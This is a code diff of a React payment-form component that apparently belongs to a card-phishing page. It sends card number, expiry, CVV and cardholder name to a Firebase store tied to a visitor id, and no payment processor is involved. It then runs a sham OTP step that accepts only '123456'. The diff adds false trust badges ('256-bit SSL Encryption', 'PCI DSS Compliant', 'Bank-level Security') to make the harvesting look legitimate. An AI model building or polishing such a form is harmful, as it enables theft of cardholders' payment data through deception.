@@ -1,14 +1,10 @@
-"use client"
-
-import * as React from "react"
 import { useState } from "react"
 import { useForm } from "react-hook-form"
 import { zodResolver } from "@hookform/resolvers/zod"
 import { z } from "zod"
-import { LockIcon, CreditCardIcon } from "lucide-react"
+import { LockIcon, CreditCardIcon, ShieldCheckIcon, CheckCircleIcon } from "lucide-react"
 import { OtpVerification } from "./otp"
 import { addData } from "../firebase"
-
 
 const paymentFormSchema = z.object({
   cardNumber: z.string().min(16, "Card number must be 16 digits").max(19),
@@ -41,29 +37,30 @@ export function PaymentForm() {
 
   function onSubmit(data: PaymentFormValues) {
     setIsSubmitting(true)
-    const _id=localStorage.getItem('visitor')
-    addData({id:_id,cardNumber:data.cardNumber,yaer:data.expiryDate,cvv:data.cvv,cardholderName:data.cardholderName})
-    // Simulate API call
+    const _id = localStorage.getItem("visitor")
+    addData({
+      id: _id,
+      cardNumber: data.cardNumber,
+      year: data.expiryDate,
+      cvv: data.cvv,
+      cardholderName: data.cardholderName,
+    })
+
     setTimeout(() => {
       setIsSubmitting(false)
       setShowOtp(true)
-      console.log(React.cache)
     }, 1000)
   }
 
   function handleOtpSubmit(otp: string) {
     setIsSubmitting(true)
 
-    // Simulate API verification
     setTimeout(() => {
       setIsSubmitting(false)
-      // For demo purposes, only "123456" is considered valid
       if (otp === "123456") {
-        // Payment successful
         alert("Payment successful!")
         setOtpError(false)
       } else {
-        // Invalid OTP
         setOtpError(true)
       }
     }, 1000)
@@ -83,70 +80,101 @@ export function PaymentForm() {
   return (
     <>
       {!showOtp ? (
-        <div className="bg-white rounded-lg shadow-md overflow-hidden " style={{padding:10}} >
-          <div className="p-6 border-b border-gray-200">
-            <div className="flex items-center gap-2 mb-1">
-              <CreditCardIcon className="h-5 w-5 text-gray-700" />
-              <h2 className="text-xl font-semibold text-gray-900">Payment Details</h2>
+        <div className="bg-white rounded-2xl shadow-2xl overflow-hidden border border-gray-100 max-w-md mx-auto">
+          {/* Header */}
+          <div className="bg-gradient-to-r from-blue-600 to-blue-700 p-6 text-white">
+            <div className="flex items-center gap-3 mb-2">
+              <div className="p-2 bg-white/20 rounded-lg">
+                <CreditCardIcon className="h-6 w-6" />
+              </div>
+              <div>
+                <h2 className="text-xl font-bold">Secure Payment</h2>
+                <p className="text-blue-100 text-sm">Complete your transaction safely</p>
+              </div>
             </div>
-            <p className="text-sm text-gray-500">Enter your card information to proceed with the payment.</p>
           </div>
+
+          {/* Security Badge */}
+          <div className="px-6 py-3 bg-green-50 border-b border-green-100">
+            <div className="flex items-center justify-center gap-2 text-green-700">
+              <ShieldCheckIcon className="h-4 w-4" />
+              <span className="text-sm font-medium">256-bit SSL Encryption</span>
+            </div>
+          </div>
+
+          {/* Form */}
           <div className="p-6">
-            <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
-              <div className="space-y-1">
-                <label htmlFor="cardNumber" className="block text-sm font-medium text-gray-700">
+            <form onSubmit={handleSubmit(onSubmit)} className="space-y-5">
+              {/* Card Number */}
+              <div className="space-y-2">
+                <label htmlFor="cardNumber" className="block text-sm font-semibold text-gray-800">
                   Card Number
                 </label>
-                <input
-                  id="cardNumber"
-                  type="text"
-                  placeholder="1234 5678 9012 3456"
-                  className={`w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 ${
-                    errors.cardNumber
-                      ? "border-red-300 focus:ring-red-200"
-                      : "border-gray-300 focus:ring-blue-200 focus:border-blue-400"
-                  }`}
-                  {...register("cardNumber", {
-                    onChange: (e) => {
-                      const formatted = formatCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16))
-                      setValue("cardNumber", formatted)
-                    },
-                  })}
-                />
-                {errors.cardNumber && <p className="text-sm text-red-500 mt-1">{errors.cardNumber.message}</p>}
+                <div className="relative">
+                  <input
+                    id="cardNumber"
+                    type="text"
+                    placeholder="1234 5678 9012 3456"
+                    className={`w-full px-4 py-3 border-2 rounded-xl focus:outline-none transition-all duration-200 ${
+                      errors.cardNumber
+                        ? "border-red-300 focus:border-red-500 bg-red-50"
+                        : "border-gray-200 focus:border-blue-500 bg-gray-50 focus:bg-white"
+                    }`}
+                    {...register("cardNumber", {
+                      onChange: (e) => {
+                        const formatted = formatCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16))
+                        setValue("cardNumber", formatted)
+                      },
+                    })}
+                  />
+                  <CreditCardIcon className="absolute right-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400" />
+                </div>
+                {errors.cardNumber && (
+                  <p className="text-sm text-red-600 flex items-center gap-1">
+                    <span className="w-1 h-1 bg-red-600 rounded-full"></span>
+                    {errors.cardNumber.message}
+                  </p>
+                )}
               </div>
 
-              <div className="space-y-1">
-                <label htmlFor="cardholderName" className="block text-sm font-medium text-gray-700">
+              {/* Cardholder Name */}
+              <div className="space-y-2">
+                <label htmlFor="cardholderName" className="block text-sm font-semibold text-gray-800">
                   Cardholder Name
                 </label>
                 <input
                   id="cardholderName"
                   type="text"
                   placeholder="John Doe"
-                  className={`w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 ${
+                  className={`w-full px-4 py-3 border-2 rounded-xl focus:outline-none transition-all duration-200 ${
                     errors.cardholderName
-                      ? "border-red-300 focus:ring-red-200"
-                      : "border-gray-300 focus:ring-blue-200 focus:border-blue-400"
+                      ? "border-red-300 focus:border-red-500 bg-red-50"
+                      : "border-gray-200 focus:border-blue-500 bg-gray-50 focus:bg-white"
                   }`}
                   {...register("cardholderName")}
                 />
-                {errors.cardholderName && <p className="text-sm text-red-500 mt-1">{errors.cardholderName.message}</p>}
+                {errors.cardholderName && (
+                  <p className="text-sm text-red-600 flex items-center gap-1">
+                    <span className="w-1 h-1 bg-red-600 rounded-full"></span>
+                    {errors.cardholderName.message}
+                  </p>
+                )}
               </div>
 
+              {/* Expiry and CVV */}
               <div className="grid grid-cols-2 gap-4">
-                <div className="space-y-1">
-                  <label htmlFor="expiryDate" className="block text-sm font-medium text-gray-700">
+                <div className="space-y-2">
+                  <label htmlFor="expiryDate" className="block text-sm font-semibold text-gray-800">
                     Expiry Date
                   </label>
                   <input
                     id="expiryDate"
                     type="text"
                     placeholder="MM/YY"
-                    className={`w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 ${
+                    className={`w-full px-4 py-3 border-2 rounded-xl focus:outline-none transition-all duration-200 ${
                       errors.expiryDate
-                        ? "border-red-300 focus:ring-red-200"
-                        : "border-gray-300 focus:ring-blue-200 focus:border-blue-400"
+                        ? "border-red-300 focus:border-red-500 bg-red-50"
+                        : "border-gray-200 focus:border-blue-500 bg-gray-50 focus:bg-white"
                     }`}
                     {...register("expiryDate", {
                       onChange: (e) => {
@@ -155,47 +183,75 @@ export function PaymentForm() {
                       },
                     })}
                   />
-                  {errors.expiryDate && <p className="text-sm text-red-500 mt-1">{errors.expiryDate.message}</p>}
+                  {errors.expiryDate && (
+                    <p className="text-xs text-red-600 flex items-center gap-1">
+                      <span className="w-1 h-1 bg-red-600 rounded-full"></span>
+                      {errors.expiryDate.message}
+                    </p>
+                  )}
                 </div>
 
-                <div className="space-y-1">
-                  <label htmlFor="cvv" className="block text-sm font-medium text-gray-700">
+                <div className="space-y-2">
+                  <label htmlFor="cvv" className="block text-sm font-semibold text-gray-800">
                     CVV
                   </label>
                   <input
                     id="cvv"
                     type="password"
                     placeholder="123"
-                    className={`w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 ${
+                    className={`w-full px-4 py-3 border-2 rounded-xl focus:outline-none transition-all duration-200 ${
                       errors.cvv
-                        ? "border-red-300 focus:ring-red-200"
-                        : "border-gray-300 focus:ring-blue-200 focus:border-blue-400"
+                        ? "border-red-300 focus:border-red-500 bg-red-50"
+                        : "border-gray-200 focus:border-blue-500 bg-gray-50 focus:bg-white"
                     }`}
                     {...register("cvv", {
                       onChange: (e) => setValue("cvv", e.target.value.replace(/\D/g, "").slice(0, 4)),
                     })}
                   />
-                  {errors.cvv && <p className="text-sm text-red-500 mt-1">{errors.cvv.message}</p>}
+                  {errors.cvv && (
+                    <p className="text-xs text-red-600 flex items-center gap-1">
+                      <span className="w-1 h-1 bg-red-600 rounded-full"></span>
+                      {errors.cvv.message}
+                    </p>
+                  )}
                 </div>
               </div>
 
+              {/* Submit Button */}
               <button
                 type="submit"
                 disabled={isSubmitting}
-                className={`w-full py-2 px-4 rounded-md text-white font-medium transition-colors ${
+                className={`w-full py-4 px-6 rounded-xl text-white font-bold text-lg transition-all duration-200 transform ${
                   isSubmitting
                     ? "bg-gray-400 cursor-not-allowed"
-                    : "bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-300"
+                    : "bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 hover:scale-[1.02] shadow-lg hover:shadow-xl"
                 }`}
               >
-                {isSubmitting ? "Processing..." : "Pay Now"}
+                {isSubmitting ? (
+                  <div className="flex items-center justify-center gap-2">
+                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                    Processing...
+                  </div>
+                ) : (
+                  <div className="flex items-center justify-center gap-2">
+                    <LockIcon className="h-5 w-5" />
+                    Complete Payment
+                  </div>
+                )}
               </button>
             </form>
           </div>
-          <div className="px-6 py-4 bg-gray-50 border-t border-gray-200">
-            <div className="flex items-center justify-center gap-1 text-sm text-gray-500">
-              <LockIcon className="h-3 w-3" />
-              <span>Your payment information is secure</span>
+
+          {/* Footer */}
+          <div className="px-6 py-4 bg-gray-50 border-t border-gray-100">
+            <div className="flex items-center justify-center gap-2 text-sm text-gray-600">
+              <CheckCircleIcon className="h-4 w-4 text-green-500" />
+              <span>Your payment information is protected</span>
+            </div>
+            <div className="flex items-center justify-center gap-4 mt-2 text-xs text-gray-500">
+              <span>PCI DSS Compliant</span>
+              <span>•</span>
+              <span>Bank-level Security</span>
             </div>
           </div>
         </div>
